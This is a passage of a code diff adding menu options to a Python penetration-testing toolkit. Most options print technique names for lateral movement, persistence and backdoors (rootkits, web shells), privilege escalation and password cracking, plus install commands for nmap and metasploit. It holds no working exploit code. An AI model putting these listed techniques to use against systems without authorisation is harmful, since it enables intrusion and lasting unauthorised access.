+            input(f"\n{BOLD}[ Press Enter to return... ]{RESET}")
+        
+        elif choice == '17':
+            feature_password_cracking()
+        
+        elif choice == '18':
+            print_header("🕵️ Lateral Movement & Pivot Tools")
+            print(f"\n{COLORS['2'][0]}Lateral Movement Techniques:{RESET}")
+            print("  • Pass-the-hash - NTLM abuse")
+            print("  • Kerberoasting - Service ticket attacks")
+            print("  • Bloodhound - AD mapping")
+            print("  • Impacket - Protocol tools")
+            input(f"\n{BOLD}[ Press Enter to return... ]{RESET}")
+        
+        elif choice == '19':
+            print_header("📡 Persistence & Backdoor Installation")
+            print(f"\n{COLORS['2'][0]}Persistence Methods:{RESET}")
+            print("  • Cron jobs - Linux scheduling")
+            print("  • Registry keys - Windows startup")
+            print("  • SSH keys - SSH persistence")
+            print("  • Rootkits - Kernel backdoors")
+            print("  • Web shells - Web persistence")
+            input(f"\n{BOLD}[ Press Enter to return... ]{RESET}")
+        
+        elif choice == '20':
+            print_header("🚪 Windows/Linux Privilege Abuse")
+            print(f"\n{COLORS['2'][0]}Privilege Abuse Techniques:{RESET}")
+            print("  Linux: Sudo, SUID, Capabilities, Kernel")
+            print("  Windows: UAC bypass, Token impersonation")
+            print("  Both: Weak permissions, Cron/Task abuse")
+            input(f"\n{BOLD}[ Press Enter to return... ]{RESET}")
+        
+        # Category 5: Analysis & Reporting
+        elif choice == '21':
+            print_header("📊 Attack Chain Analyzer & Visualizer")
+            target = input("Enter target type (web/network/wireless/social): ").strip().lower()
+            chain = _pt_generate_exploit_chain(target)
+            print(f"\n{BOLD}Exploit Chain for {target.title()}:{RESET}")
+            for step in chain:
+                print(f"  {step}")
+            input(f"\n{BOLD}[ Press Enter to return... ]{RESET}")
+        
+        elif choice == '22':
+            print_header("📋 Report Generator & Documentation")
+            report_name = input("Report name: ").strip()
+            target = input("Target/Client: ").strip()
+            if report_name and target:
+                remediation = _pt_generate_remediation_plan([
+                    {'severity': 'CRITICAL'},
+                    {'severity': 'HIGH'},
+                    {'severity': 'MEDIUM'}
+                ])
+                print(f"\n{COLORS['2'][0]}✅ Report template generated:{RESET}")
+                print(f"  Name: {report_name}")
+                print(f"  Target: {target}")
+                print(f"  Findings structure created")
+            input(f"\n{BOLD}[ Press Enter to return... ]{RESET}")
+        
+        elif choice == '23':
+            print_header("📈 Compliance & Framework Checker")
+            framework = input("Select framework (OWASP_TOP_10/NIST/ISO27001/PCI-DSS): ").strip()
+            checks = _pt_compliance_checker(framework)
+            print(f"\n{BOLD}{framework} Checks:{RESET}")
+            for check in checks:
+                print(f"  ☐ {check}")
+            input(f"\n{BOLD}[ Press Enter to return... ]{RESET}")
+        
+        elif choice == '24':
+            print_header("🎓 Training & Knowledge Base")
+            print(f"\n{COLORS['2'][0]}Learning Resources:{RESET}")
+            print("  • OWASP Top 10 - Web vulnerabilities")
+            print("  • CEH v11 - Certified Ethical Hacker")
+            print("  • OSCP - Offensive Security cert")
+            print("  • HackTheBox - CTF training")
+            print("  • TryHackMe - Interactive labs")
+            print("  • SANS courses - Professional training")
+            input(f"\n{BOLD}[ Press Enter to return... ]{RESET}")
+        
+        # Category 6: System & Infrastructure
+        elif choice == '25':
+            os.system('cls' if os.name == 'nt' else 'clear')
+            print_header("🛠️ PT Tool Installation Manager")
+            print(f"\n{BOLD}Installation Commands:{RESET}\n")
+            print(f"{COLORS['6'][0]}Debian/Ubuntu:{RESET}")
+            print("  sudo apt-get install -y nmap metasploit-framework")
+            print(f"\n{COLORS['6'][0]}Fedora/RHEL:{RESET}")
+            print("  sudo dnf install -y nmap")
+            print(f"\n{COLORS['6'][0]}macOS:{RESET}")
+            print("  brew install nmap aircrack-ng john")
+            input(f"\n{BOLD}[ ⌨️ Press Enter to return... ]{RESET}")
+        
+        elif choice == '26':
             feature_download_center()
+        
+        elif choice == '27':
+            print_header("⚙️ Tool Benchmarking & Optimization")
+            print(f"\n{COLORS['2'][0]}Performance Metrics:{RESET}")
+            print("  • Nmap scan speed: Adjust -T0 to -T5")
+            print("  • Hashcat GPU utilization: CUDA/OpenCL")
+            print("  • Parallel job optimization")
+            print("  • Memory usage analysis")
+            input(f"\n{BOLD}[ Press Enter to return... ]{RESET}")
+        
         else:
             print(f"{COLORS['1'][0]}Invalid option{RESET}")
             time.sleep(1)
